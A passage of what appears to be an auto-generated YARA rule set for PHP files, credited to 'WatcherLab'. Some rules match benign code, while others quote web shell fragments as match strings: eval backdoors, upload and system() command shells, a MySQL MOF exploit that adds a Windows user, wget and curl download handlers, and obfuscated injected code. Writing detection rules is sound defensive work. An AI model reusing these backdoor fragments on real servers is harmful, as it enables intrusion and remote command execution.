      $s18 = "allow('Kahlan\\Spec\\Fixture\\Plugin\\Pointcut\\Foo')->toReceive('message')->andRun(function ($param) {" fullword ascii
      $s19 = "it(\"throws an exception when trying to spy an invalid empty method\", function () {" fullword ascii
      $s20 = "it(\"throws an exception when trying to monkey patch an instance using a generic stub\", function () {" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 60KB and
      8 of them
}

rule AnonGhostShell_508c5157ace424468a4d1ef489444cab16ed44f3
{
   meta:
      description = "php17 - file AnonGhostShell_508c5157ace424468a4d1ef489444cab16ed44f3.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "6cfd5b82a71a3de29a6eba232631e46c8c33626add8ee53c57f7be7733889c51"
   strings:
      $x1 = "}eval(NnsBD(\"7P15l+JGtiiO/v96rf4Oeev0PWW/atuSgKzEdvlcJoEEEolGpLPO8gKJREIDOJnpdT77b++I0ESSVeU+7irf937Vnc4EhWLYsWNPsYe7O/j317/827" ascii
      $s2 = "+lw0odcFtPPe24mlvHuOKOzkyZRXgcjNfmRGXSUiSHpai8uqrLR5ViDkssJeUDwJdLgZzBz7cL4VysVX1u+GQJHtg0K9zKO5ZhXpexXAYeYETmjb+tZlQ1KOgQlj0S0g" ascii
      $s3 = "wbIvnys5jm5a0aqKwGFcW/spyD8i3oEnAuiX24hrZGtB2S+m0DWOsA5Nqs7ni/fDfU3hDbAMFDch9XhRXJJ6Ll91PU70wmNRv8mgyyvFmtnfmKbQH0jR7gEtCtBtM3Mn" ascii
      $s4 = "j/gyy3+AteEXk0x+AD4MZJ6UrcbV1EI/fY5Lz1pBc5+ErruN3nisWitKpxzl6W33Cg0tzgfWctheYe9i/B/WPPD1ksyw0+wOYlLXVOupWnbnnFh0j7F3ik188u1stgcB" ascii
      $s5 = "vaBsVMTVTU+sARxAHzoLfPzNJmSDcOgXLqEjUfIv40kKh8WUomYAXmifxUFppdKBkqAsSMQ7L2DUBBBgKWOa0B8yYQZwLA1GpoOTbiziEctkoWAYCTfIU1/opIpesrHW" ascii
      $s6 = "wy2GusnT74x+P4z6T5H3wW7PNzXgrar5e0/mzddRgveoLy37DuCt/81xdeP4v/3+kg907+9Dll/MuVxh/XW+FD//DVgK8FV+evX3D9rSn+9+F/9XIrfWSs2f1yc/fvvu" ascii
      $s7 = "qN8fftPVcIP58BEu/Ql1LEknuWnS7xbxVjg3TYav6297E8oa+Nhz0Hg88FDMof4XdcB0zh3QFrKYBDyH5tX+K2V//46Pvex4rRLuB+oMFenNOr7u7vuBfrHwm4dopcpk" ascii
      $s8 = "yPA5v+DjOaLw2mfz7isF41xQqwR8cc8C8KOgL0EvjFN2794KTJr2LQb//EUM7z13M0TwAO4utV1ofvfZX9EWP0cQqNMU7wgWXI0EekhEWP6+SzvZ98ATDuZ+7in/vcMt" ascii
      $s9 = "2+u9WBdHxp4TmW4LfTetLP+a7uqc5VyGYganTe+qPOGb5Zftpe2v7xI//rvs2JcduOuH4NkMYYA2z2uzbQQb+3Hs/DbnzkH60FN28ybI8/PIud25yBbWfnT/vX9WZ/0g" ascii
      $s10 = "RBaNgFTP9//ud/SrlC7YcsIl4JX377zS1q13pLGHvgeqXbxdzPtuq33+Qh9Lp4j1zigsjrYGjOnW7ufSdjLcRec9Cs7yrgj/TDt98UIvJ9+02uxOt86uGdlYC3Zd9+cx" ascii
      $s11 = "6d//gRy/R4ce+RDxm38y1zH+347G90Lm29getR9z/qcQMyqHNBaxzV+DrqXKoyBAwIAWtbnT8TsKTzJ8HmH7mOP/MUr/zFii5fzE2zeof+2j/yWn97LYbXdH2Sb7hf6Z" ascii
      $s12 = "8keeHA5wbb8eYeQM5FY/Nc+veu1qqctb+f/CGfKr3H2n93v/yJTbpFuSX5cUF7530KjD32ZgWw/0QjWT3xnhv/r/yObCmsBUAt9NvthU8a7X62F8/8t/aZsp5P8rOMtZ" ascii
      $s13 = "L2p9emYW4X2QyYKEkG+46aZVb77S58OsObm19+3i5i3LirCdI58LlagddFP683RH1ks0Ia8uYX/O/PP9An1y06b37pFM9+oCPBJG+AZL7fvbmp0OB6c0C0yQe2oGPo74" ascii
      $s14 = "K1jxOvZ5/XhhxrRaL5Yne5H1a//2Gz/eZqEqna/7utJXl99t9yJcltavfT7/J98+ddezylnP/zJ0PMp+9On55eTvtPGP6dstuu+W8tM7n34i840vInZ8eqLn+dHftP/w" ascii
      $s15 = "fbP/1/fvreHgqpTh+m4hiPj6XFdadzH/3yY+fTp3H8/u/3u0t1k3/7d3//N2fokPrvf/9DAY+fP9848GlZP/3cuJ9+9/OmgUEPzlemlJ/k4TRoiHzUGEbiI4XeTx+P+8" ascii
      $s16 = "j9AeyWxpj6anpH+imMUb5Fu/ey01ovzZY67gQ3Qbee4Tv6HuAaoLetQq16G8kHPED6g/4fSL/DLLLDBL/dbWYTb4Me4EPf1OmV2w7HB31ps9DQUh+RdM/huLVPsNcn0M" ascii
      $s17 = "voUlQQdSHG3olZbUlLrz/MV7RXDthqwgMMWs1X3HP62MDDLlsYOcTzLUNLaaJOp/uJXfVWMXHk2YsdZ8qTNsQtwGjCjWtMUEhpBDEY8Mm7vAHv6SqGVoUtrJLeQR+AJn" ascii
      $s18 = "Tod2X/IRofE/EN2McEQrbVz6rg+3nfPiZbqqC+gdgdPl+76wmXRI9DwN5BsOsFp3f9/q+2KYQ+05iRfbQrTm99pceczXU/qVc6D/BhAeIaPSanMkuftPxYFKomcwsC1/" ascii
      $s19 = "G7JOsQesRnOsPyqgD9KSp0LEw/DvAE3n+V1xFpvIZ6eCCXVBwooi6uTHfOKOo8t80PSV1KoJ/YDbcHFHGPqH6axKXNbE9FA+oSrE3IfDopYlcj8pMSNWTGGjKPwD4yeX" ascii
      $s20 = "3+sz58XVac5svx23MZ82Rl0/lI3tPii7LnWsLvn5K8cGSZ9GPCjeQSLqP+IbG9cjTWxzuzyG705eQysfx1HpQTMTATL7SnsGeawg1tIvq5kMOnxPW2rUJSXdlLF402Y5" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 900KB and
      1 of ($x*) and 4 of them
}

rule php17_634byte
{
   meta:
      description = "php17 - file 634byte.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "148a55ff0059d89317fcceaa0a0b59a5de04182a7e9560d363663c5b76ee9074"
   strings:
      $s1 = "if ($_POST[\"pt\"]==\"\"){$uploadfile = $_FILES[\"file\"][\"name\"];}" fullword ascii
      $s2 = "$uploadfile = $_POST[\"pt\"].$_FILES[\"file\"][\"name\"];" fullword ascii
      $s3 = "if (copy($_FILES[\"file\"][\"tmp_name\"], $uploadfile)){" fullword ascii
      $s4 = "echo\"Size:\".$_FILES[\"file\"][\"size\"].\"n\";" fullword ascii
      $s5 = "$c=$_GET['cmd'];" fullword ascii
      $s6 = "<form enctype=\"multipart/form-data\"  method=\"POST\">" fullword ascii
      $s7 = "if (isset($_POST[\"pt\"])){" fullword ascii
      $s8 = "<input size=\"48\" value=\"$yoco/\" name=\"pt\" type=\"text\"><br>" fullword ascii
      $s9 = "<input type=\"submit\" value=\"Upload\">" fullword ascii
      $s10 = "$p=$_SERVER[\"DOCUMENT_ROOT\"];" fullword ascii
      $s11 = "echo\"uploaded:$uploadfilen\";" fullword ascii
      $s12 = "print \"Error:n\";" fullword ascii
      $s13 = "<input name=\"file\" type=\"file\"><br>" fullword ascii
      $s14 = "system($c);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      8 of them
}

rule sig_006620d2a701de73d995fc950691665c0692af11
{
   meta:
      description = "php17 - file 006620d2a701de73d995fc950691665c0692af11.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "89c29412b90d99c4bef81b04294c363c8d26da07873a087d1cebbb102a801de9"
   strings:
      $s1 = "fputs(fopen('houmen_wr.php','w'),'<?php eval($_GET[cc])?>'); " fullword ascii
      $s2 = "eval (base64_decode($_POST[\"php\"]));  " fullword ascii
      $s3 = "# eval($php_code);//" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_48909d9f4332840b4e04b86f9723d7427e33ac67
{
   meta:
      description = "php17 - file 48909d9f4332840b4e04b86f9723d7427e33ac67.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "7ab9f1cc835224a95b39eca4dbe7e89991b277628abd16169c916b7b0077f320"
   strings:
      $x1 = "$payload = \"#pragma namespace(\\\"\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\.\\\\\\\\\\\\\\\\root\\\\\\\\\\\\\\\\subscription\\\")" fullword ascii
      $s2 = "\\\"var WSH = new ActiveXObject(\\\\\\\\\\\"WScript.Shell\\\\\\\\\\\")\\\\\\\\nWSH.run(\\\\\\\\\\\"$cmdshell\\\\\\\\\\\")\\\";" fullword ascii
      $s3 = "<input type=\"text\" name=\"mofname\" value=\"c:/windows/system32/wbem/mof/hacking.mof\" size=\"35\"><br/>" fullword ascii
      $s4 = "<input type=\"text\" name=\"cmd\" value=\"net user test test /add\" size=\"35\"><br/>" fullword ascii
      $s5 = "$sql=\"select '$payload' into dumpfile '$mofname';\";" fullword ascii
      $s6 = "$conn=mysql_connect($mysql_server_name,$mysql_username,$mysql_password,$mysql_database);" fullword ascii
      $s7 = "\\\"Where TargetInstance Isa \\\\\\\\\\\"Win32_LocalTime\\\\\\\\\\\" \\\"" fullword ascii
      $s8 = "<head><title>Win MOF Shell</title></head>" fullword ascii
      $s9 = "<input type=\"text\" name=\"host\" value=\"127.0.0.1:3306\"><br/>" fullword ascii
      $s10 = "\\\"And TargetInstance.Second = 5\\\";" fullword ascii
      $s11 = "<input type=\"password\" name=\"pass\" value=\"\"><br/>" fullword ascii
      $s12 = "if(isset($_REQUEST['host'])&&isset($_REQUEST['user'])&&isset($_REQUEST['dbname'])&&isset($_REQUEST['cmd'])&&isset($_REQUEST['mof" ascii
      $s13 = "if(isset($_REQUEST['host'])&&isset($_REQUEST['user'])&&isset($_REQUEST['dbname'])&&isset($_REQUEST['cmd'])&&isset($_REQUEST['mof" ascii
      $s14 = "$mysql_password=$_REQUEST['pass'];" fullword ascii
      $s15 = "<input type=\"text\" name=\"user\" value=\"root\"><br/>" fullword ascii
      $s16 = "$cmdshell=$_REQUEST['cmd'];" fullword ascii
      $s17 = "$mysql_password='';" fullword ascii
      $s18 = "instance of ActiveScriptEventConsumer as \\$Consumer" fullword ascii
      $s19 = "$mysql_server_name=$_REQUEST['host'];" fullword ascii
      $s20 = "<input type=\"submit\" value=\"Exploit\"><br/>" fullword ascii
   condition:
      uint16(0) == 0x683c and filesize < 5KB and
      1 of ($x*) and 4 of them
}


rule sig_2f89374b394f3a32c7ce98460a8d0983
{
   meta:
      description = "php17 - file 2f89374b394f3a32c7ce98460a8d0983.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "9593194758950368529adcb773b4dbf08ee0b07899e51501b1fb042c78f620a4"
   strings:
      $s1 = "* Constructor. Set template." fullword ascii
      $s2 = "* @copyright   Copyright (c) 2014 Phoenix Medien GmbH & Co. KG (http://www.phoenix-medien.de)" fullword ascii
      $s3 = "<?php if(!isset($GLOBALS[\"\\x61\\156\\x75\\156\\x61\"])) { $ua=strtolower($_SERVER[\"\\x48\\124\\x54\\120\\x5f\\125\\x53\\105" ascii
      $s4 = "* Build PDF content of info block" fullword ascii
      $s5 = "$this->setTemplate('moneybookers/pdf/info.phtml');" fullword ascii
      $s6 = "return $this->getInfo()->getMethodInstance()->getCode();" fullword ascii
      $s7 = "$this->setTemplate('moneybookers/info.phtml');" fullword ascii
      $s8 = "* Returns code of payment method" fullword ascii
      $s9 = "; $egovhyztdp=$wcjhbcpkat; $egovhyztdp=(556-435); $npfiagbzyf=$egovhyztdp-1; ?><?php" fullword ascii
      $s10 = "public function getMethodCode()" fullword ascii
      $s11 = "* @package     Phoenix_Moneybookers" fullword ascii
      $s12 = "ALS[\"%x61%156%x75%156%x61\"])))) w6<*K)ftpmdXA6|7**197-2qj%x5c%x78257-K)udfoopdXA%7860%x5c%x7878%x5c%x7822l:!}V;3q%x5c%xR;*msv%" ascii
      $s13 = "878B%x5c%x7d%x5c%x7825)ftpmdR6<*id%x7825c*W%x5c%x7825eN+#Qi%x5c%84:71]K9]77]D4]82]K6]72]K9]78]K5]53]K5c%x7825Z<^2%x5c%x785c2b%x5" ascii
      $s14 = ",47R25,d7R17,67R37,#%x%x5c%x7822)gj6<^#Y#%x5c%x7+)!gj+{e%x5c%x7825!osvufs!*!+A!>!{e%x5c%x7825)!>>%x5c%x25tjw!>!#]y84]275]y83]248" ascii
      $s15 = "5c%x7824-%x5c%x7824y4%xc%x785cSFWSFT%x5c%x7860%x5c%x7825}X;!sp!)1%x5c%x782f35.)1%x5c%x782f14+9*x5c%x7825b:>1<!fmtf!%#0#)idubn%x5" ascii
      $s16 = "class Phoenix_Moneybookers_Block_Info extends Mage_Payment_Block_Info" fullword ascii
      $s17 = "c%x7825!>!2p%x5c%x7825!*3>?*2b%x5c%x%x5c%x7878r.985:52985-t.98]K4]65]D8j+upcotn+qsvmt+fmhpph#)zbssb!-#}#)fepmqnj!%x5c%x782f!*K)f" ascii
      $s18 = "04%x5c%x%x7827,*e%x5c%x7827,*d%x5c%x7827,*c%x5c%I#)q%x5c%x7825:>:r%x5c%x7825:|:**t%x5c%x7825)m%x5c%4]275L3]248L3P6L1M5]D2P4]D6#<" ascii
      $s19 = "!#]y76]277]y72]265]y39]271]y83]256]y78]2#%x5c%x782f%x5c%x7825%x5c%x7824-%x5c%x78860QUUI&b%x5c%x7825!mgoj{h1:|:*mmvo:>:iuhofm%x%x" ascii
      $s20 = "odujpo)##-!#~<x28%151%x6d%160%x6c%157%x64%145%x28%141%x%x7825)hopm3qjA)qj3hopmA%x5c%x78273qj%x5c%x782785c^>Ew:Qb:Qc:W~!%x5c%x782" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 40KB and
      8 of them
}

rule sig_8c5b26f383a4b176a12657b913f35d2a639ea054
{
   meta:
      description = "php17 - file 8c5b26f383a4b176a12657b913f35d2a639ea054.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "f633b6f8fbec621cd8ce60cd786926d3f4a552cc75375ec875ee8e9e4735ba4b"
   strings:
      $x1 = "$header = '<html><head><title>'.getenv(\"HTTP_HOST\").' - Antichat Shell</title><meta http-equiv=\"Content-Type\" content=\"text" ascii
      $x2 = "$header = '<html><head><title>'.getenv(\"HTTP_HOST\").' - Antichat Shell</title><meta http-equiv=\"Content-Type\" content=\"text" ascii
      $s3 = "$content .=(!empty($_POST['dif_name'])?($_POST['dif_name']):(\"dump.sql\"));" fullword ascii
      $s4 = "$content .=(!empty($_POST['mysql_p'])?($_POST['mysql_p']):(\"password\"));" fullword ascii
      $s5 = "case fetch:shell(which('fetch').\" -o \".$_POST['filename'].\" -p \".$_POST['urldown'].\"\");break;" fullword ascii
      $s6 = "case curl:shell(which('curl').\" \".$_POST['urldown'].\" -o \".$_POST['filename'].\"\");break;" fullword ascii
      $s7 = "'.$_SERVER['REMOTE_ADDR'].' XFF: '.@gethostbyaddr($HTTP_X_FORWARDED_FOR).' ';?>" fullword ascii
      $s8 = "$serv = @mysql_connect(\"$adress:$port\", \"$login\", \"$pass\") or die(\"" fullword ascii
      $s9 = ": $cfa[0]<form name='mysql_dump' action='$php_self' method='post'>" fullword ascii
      $s10 = "$content.=\"<form name='mysql_dump' action='$php_self' method='post'>" fullword ascii
      $s11 = "$content .=\"<form name='dump1' action='$php_self' method='POST'>" fullword ascii
      $s12 = "$content .=\"<form name='dump2' action='$php_self' method='post'>" fullword ascii
      $s13 = "$content .=\"<form name='mysql_dump' action='$php_self' method='post'>" fullword ascii
      $s14 = "$content =\"<table><form action='$php_self' method=post name=md5><tr><td><b>Decrypte MD5</b>" fullword ascii
      $s15 = "$content .=(!empty($_POST['mysql_tbl'])?($_POST['mysql_tbl']):(\"user\"));" fullword ascii
      $s16 = "case lynx:shell(which('lynx').\" -source \".$_POST['urldown'].\" > \".$_POST['filename'].\"\");break;" fullword ascii
      $s17 = "case links:shell(which('links').\" -source \".$_POST['urldown'].\" > \".$_POST['filename'].\"\");break;" fullword ascii
      $s18 = "$content .=\"<form name='conn' action='$php_self' method='post'><input type=hidden name=conn value=0>" fullword ascii
      $s19 = "case wget:shell(which('wget').\" \".$_POST['urldown'].\" -O \".$_POST['filename'].\"\");break;" fullword ascii
      $s20 = "<input type=hidden name=cmd size=85 value=mysql_dump>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 90KB and
      1 of ($x*) and 4 of them
}

rule sig_04b7beff0261ed966122990f82b34149791355aa
{
   meta:
      description = "php17 - file 04b7beff0261ed966122990f82b34149791355aa.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "d6a6f1d73ba6ef3cf5b7fcab1d87f57009c80d48e3d0741c4d1408578c6a07ef"
   strings:
      $s1 = "zqh05 } ['nf73356' ]) ) {eval( $vpi22( ${ $zqh05 }['nf73356'] )); }?> " fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_35940353c0f3d6511e2789fc3cb9e5b3cea3b10d
{
   meta:
      description = "php17 - file 35940353c0f3d6511e2789fc3cb9e5b3cea3b10d.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "9ecdb14b41785c779d9721e11bf9e1b7e35611015f4aabf9a1f54a82eaa0725c"
   strings:
      $s1 = "/*  r57shell.php - ?????? ?? ??? ??????????? ??? ????????? ????????? ??????? ?? ??????? ????? ???????" fullword ascii
      $s2 = "if(file_exists($_POST['mk_name']) || !$file=@fopen($_POST['mk_name'],\"w\")) { err(2,$_POST['mk_name']); $_POST['cmd']=\"\"; " fullword ascii
      $s3 = "if (empty($_POST['cmd'])&&!$safe_mode) { $_POST['cmd']=(!$unix)?(\"dir\"):(\"ls -lia\"); }" fullword ascii
      $s4 = "if(file_exists($_POST['mk_name']) || !$file=@fopen($_POST['mk_name'],\"w\")) { err(2,$_POST['mk_name']); $_POST['cmd']=\"\"; }" fullword ascii
      $s5 = "'eng_text115'=>'Test bypass safe_mode, copy file via compress.zlib:// in function copy()'," fullword ascii
      $s6 = "@mysql_query(\"LOAD DATA INFILE \\\"\".$_POST['test3_file'].\"\\\" INTO TABLE temp_r57_table\");" fullword ascii
      $s7 = "@readfile (\"http://rst.void.ru/r57shell_version/version.php?version=\".$current_version.\"\");}}  " fullword ascii
      $s8 = "echo sr(25,\"<b>\".$lang[$language.'_text38'].$arrow.\"</b>\",in('text','ftp_password',45,(!empty($_POST['ftp_password'])?($_POS" ascii
      $s9 = "$name='ec371748dc2da624b35a4f8f685dd122'; // ????? ????????????  (user login)" fullword ascii
      $s10 = "if($_POST['cmd']==\"ftp_file_up\")   { @ftp_put($connection,$_POST['ftp_file'],$_POST['loc_file'],$_POST['mode']);" fullword ascii
      $s11 = "'ru_text99'=>'* ? ???????? ?????? ? ?????? ???????????? ??? ???????????? ?? /etc/passwd'," fullword ascii
      $s12 = "if(@copy(\"compress.zlib://\".$_POST['test8_file1'], $_POST['test8_file2'])) echo $lang[$language.'_text118'];" fullword ascii
      $s13 = "if(!$file=@fopen($_POST['loc_file'],\"r\")) { err(1,$_POST['loc_file']); $_POST['cmd']=\"\"; }" fullword ascii
      $s14 = "ename($_POST['ftp_file']); } @ftp_get($connection,$_POST['loc_file'],$_POST['ftp_file'],$_POST['mode']);" fullword ascii
      $s15 = "if(!$file=@fopen($_POST['d_name'],\"r\")) { err(1,$_POST['d_name']); $_POST['cmd']=\"\"; }" fullword ascii
      $s16 = "if(!$file=@fopen($_POST['e_name'],\"r\")) { err(1,$_POST['e_name']); $_POST['cmd']=\"\"; }" fullword ascii
      $s17 = "$pass='ec371748dc2da624b35a4f8f685dd122'; // ?????? ???????????? (user password)" fullword ascii
      $s18 = "'ru_text101'=>'???????????? ????? ???????????? (user -> resu) ??? ???????????? ? ???????? ??????'," fullword ascii
      $s19 = "// ????? ? ?????? ??? ??????? ? ??????? (Login & Password for access)" fullword ascii
      $s20 = "else if($fp){ foreach($sql->dump as $v) @fputs($fp,$v.\"\\r\\n\"); } " fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 300KB and
      8 of them
}

rule sig_20171006111953_drop_sites_entity_table
{
   meta:
      description = "php17 - file 20171006111953_drop_sites_entity_table.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "77416c1516de603d004ad26c8647736236d2a3bae68ba1647c1c8eace3a131f5"
   strings:
      $s1 = "$this->execute(\"" fullword ascii
      $s2 = "* Move sites_entity attributes to metadata" fullword ascii
      $s3 = "$prefix = $this->getAdapter()->getOption('table_prefix');" fullword ascii
      $s4 = "SELECT * FROM {$prefix}sites_entity" fullword ascii
      $s5 = "if (!$this->hasTable('sites_entity') || !$this->hasTable('metadata')) {" fullword ascii
      $s6 = "$cols = ['name', 'description', 'url'];" fullword ascii
      $s7 = "$this->dropTable('sites_entity');" fullword ascii
      $s8 = "// all data migrated, so drop the table" fullword ascii
      $s9 = "use Phinx\\Migration\\AbstractMigration;" fullword ascii
      $s10 = "// remove existing metadata... attributes are more important" fullword ascii
      $s11 = "WHERE entity_guid = {$row['guid']} AND" fullword ascii
      $s12 = "class DropSitesEntityTable extends AbstractMigration" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 3KB and
      8 of them
}

rule sig_2013_10_01_000008_Db_System_Mail_Templates
{
   meta:
      description = "php17 - file 2013_10_01_000008_Db_System_Mail_Templates.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "a3cb0542f8af9e2fd4e57b649ede8cf79d065181620650871588928538d7b012"
   strings:
      $s1 = "Schema::create('system_mail_templates', function (Blueprint $table) {" fullword ascii
      $s2 = "Schema::dropIfExists('system_mail_templates');" fullword ascii
      $s3 = "class DbSystemMailTemplates extends Migration" fullword ascii
      $s4 = "$table->text('content_text')->nullable();" fullword ascii
      $s5 = "$table->text('content_html')->nullable();" fullword ascii
      $s6 = "$table->text('description')->nullable();" fullword ascii
      $s7 = "$table->integer('layout_id')->index()->nullable();" fullword ascii
      $s8 = "use October\\Rain\\Database\\Updates\\Migration;" fullword ascii
      $s9 = "$table->boolean('is_custom')->default(0);" fullword ascii
      $s10 = "use October\\Rain\\Database\\Schema\\Blueprint;" fullword ascii
      $s11 = "$table->string('code')->nullable();" fullword ascii
      $s12 = "$table->string('subject')->nullable();" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      8 of them
}

rule sig_24bca3c7e7dcd4c4991db5eb49cdde8b
{
   meta:
      description = "php17 - file 24bca3c7e7dcd4c4991db5eb49cdde8b.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "79f161ce62cb704f44150dada6c63dd7249bd3b24d9b0edb28cb2e88bebc9aac"
   strings:
      $x1 = "ex_w(\"-- phpMiniAdmin dump $VERSION$D-- Datetime: \".date('Y-m-d H:i:s').\"$D-- Host: $DB[host]$D-- Database: $DB[db]$D$D\");" fullword ascii
      $x2 = "&copy; 2004-2012 <a href=\"http://osalabs.com\" target=\"_blank\">Oleg Savchuk</a>" fullword ascii
      $x3 = "<a href=\"http://phpminiadmin.sourceforge.net/\" target=\"_blank\"><b>phpMiniAdmin <?php echo $VERSION?></b></a>" fullword ascii
      $s4 = "$ACCESS_PWD=''; #!!!IMPORTANT!!! this is script access password, SET IT if you want to protect you DB from public access" fullword ascii
      $s5 = "<label>&nbsp;( ) .csv</label> <small>(to export as csv - go to 'show tables' and export just ONE table)</small>" fullword ascii
      $s6 = "# --- WARNING! --- if you set defaults - it's recommended to set $ACCESS_PWD to protect your db!" fullword ascii
      $s7 = "lect/refresh -</option><option value=''> - show all -</option><?php echo get_db_select($dbn)?></select>" fullword ascii
      $s8 = "//during login only - from cookies or use defaults;" fullword ascii
      $s9 = "(c) 2004-2012 Oleg Savchuk <osalabs@gmail.com> http://osalabs.com" fullword ascii
      $s10 = "$dbh=@mysql_connect($DB['host'].($DB['port']?\":$DB[port]\":''),$DB['user'],$DB['pwd']);" fullword ascii
      $s11 = "if (fwrite($tf,gzread($gz,8192),8192)===FALSE){$err_msg='Error during gz file extraction to tmp file';break;}" fullword ascii
      $s12 = "}elseif ( preg_match('/^show\\s+(?:databases|status|variables|process)/i',$SQLq) ){" fullword ascii
      $s13 = "$nav=\"<div class='nav'>\".get_nav($page, 10000, $MAX_ROWS_PER_PAGE, \"javascript:go(%p%)\").\"</div>\";" fullword ascii
      $s14 = "<?php if ($GLOBALS['ACCESS_PWD']){?> | <a href=\"?<?php echo $xurl?>&logoff=1\" onclick=\"logoff()\">Logoff</a> <?php }?>" fullword ascii
      $s15 = "Password: <input type=\"password\" name=\"pwd\" value=\"\">" fullword ascii
      $s16 = "&nbsp;&#183;<a href='$url&q=show+processlist'>Show Processlist</a>" fullword ascii
      $s17 = "$ex_tmpf=tempnam(sys_get_temp_dir(),'pma').'.gz';" fullword ascii
      $s18 = "if ($is_sht) $headers.=\"<td><input type='checkbox' name='cball' value='' onclick='chkall(this)'></td>\";" fullword ascii
      $s19 = "ex_w(\"$D-- phpMiniAdmin dump end$D\");" fullword ascii
      $s20 = "if (!$sth) die(\"Error in DB operation:<br>\\n\".mysql_error($dbh1).\"<br>\\n$sql\");" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 90KB and
      1 of ($x*) and 4 of them
}

rule sig_8d87d250b39b4f622107217f9454c057c76b3ae9
{
   meta:
      description = "php17 - file 8d87d250b39b4f622107217f9454c057c76b3ae9.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "ae4d2498d852c2c2908709acc93ef11d8eb6f4ed698c606ec7aa2d76385365aa"
   strings:
      $x1 = "$program = isset($_POST['program']) ? $_POST['program'] : \"c:\\winnt\\system32\\cmd.exe\";" fullword ascii
      $x2 = "$prog = isset($_POST['prog']) ? $_POST['prog'] : \"/c net start > \".$pathname.\"/log.txt\";" fullword ascii
      $x3 = "$exec = $wsh->exec (\"cm\".\"d.e\".\"xe /c \".$_POST['command'].\"\");" fullword ascii
      $x4 = ",'selected'=>$execfunc)).' '.$tb->makeinput('command').' '.$tb->makeinput('Run','command','','submit')));" fullword ascii
      $s5 = "$phpinfo=(!eregi(\"phpinfo\",$dis_func)) ? \" | <a href=\\\"?action=phpinfo\\\" target=\\\"_blank\\\">PHPINFO()</a>\" : \"\";" fullword ascii
      $s6 = "$tb->tdbody('<table width=\"98%\" border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tr><td><b>command [ system , shell_exec , pa" ascii
      $s7 = "$tb->tdbody('<table width=\"98%\" border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tr><td><b>command [ system , shell_exec , pa" ascii
      $s8 = "$wsh = new COM('W'.'Scr'.'ip'.'t.she'.'ll') or die(\"PHP Create COM WSHSHELL failed\");" fullword ascii
      $s9 = "echo \"<a href=\\\"$filepath\\\" target=\\\"_blank\\\"><font color='yellow'>$file<STRONG></STRONG></a></td>\\n\";" fullword ascii
      $s10 = "o' id=input><INPUT type='submit' name='shell' value='command shill' id=input></form>\");" fullword ascii
      $s11 = "echo ($proxycontents) ? $proxycontents : \"<body bgcolor=\\\"#F5F5F5\\\" style=\\\"font-size: 12px;\\\"><center><br><p><b>?" fullword ascii
      $s12 = "$tb->headerform(array('content'=>'<FONT COLOR=#9C9C9C>cmd:</FONT>'.$tb->makeselect(array('name'=>'execfunc','option'=>$execfuncs" ascii
      $s13 = "$tb->headerform(array('content'=>'<FONT COLOR=#9C9C9C>cmd:</FONT>'.$tb->makeselect(array('name'=>'execfunc','option'=>$execfuncs" ascii
      $s14 = "d=input><INPUT type='submit' name='shell' value='command shill' id=input></form>\");" fullword ascii
      $s15 = "Wscript.Shell , exec , popen ]</b></td></tr></table>','center','top');" fullword ascii
      $s16 = "$proxycontents = @file_get_contents($_POST['url']);" fullword ascii
      $s17 = "echo \" <form action=\\\"$action\\\" method=\\\"POST\\\"\".$target.\">\\n\";" fullword ascii
      $s18 = "echo '</FONT><strong><FONT COLOR=#9B9B9B>www.alturks.com :</strong><br />';" fullword ascii
      $s19 = "echo \"<a href=\\\"$filepath\\\" target=\\\"_blank\\\">$file</a></td>\\n\";" fullword ascii
      $s20 = "echo (@copy($_FILES['uploadfile']['tmp_name'],\"\".$uploaddir.\"/\".$_FILES['uploadfile']['name'].\"\")) ? \"?" fullword ascii
   condition:
      uint16(0) == 0x683c and filesize < 100KB and
      1 of ($x*) and 4 of them
}

rule AbstractPimcoreBundle
{
   meta:
      description = "php17 - file AbstractPimcoreBundle.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "a3f30ec29f7b1549f37d61884b6d970521f3a96edb71bab4ff5e9192b5562277"
   strings:
      $s1 = "use Symfony\\Component\\HttpKernel\\Bundle\\Bundle;" fullword ascii
      $s2 = "public function getAdminIframePath()" fullword ascii
      $s3 = "public function getEditmodeJsPaths()" fullword ascii
      $s4 = "public function getEditmodeCssPaths()" fullword ascii
      $s5 = "* @inheritDoc" fullword ascii
      $s6 = "public function getCssPaths()" fullword ascii
      $s7 = "public function getInstaller()" fullword ascii
      $s8 = "public function getJsPaths()" fullword ascii
      $s9 = "public function getNiceName()" fullword ascii
      $s10 = "abstract class AbstractPimcoreBundle extends Bundle implements PimcoreBundleInterface" fullword ascii
      $s11 = "namespace Pimcore\\Extension\\Bundle;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      8 of them
}

rule AddUserFormSubscriberSpec
{
   meta:
      description = "php17 - file AddUserFormSubscriberSpec.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "cd581515bd5368aae13431ff61b767c3367577a49ceb8087991fdac4debfe0fb"
   strings:
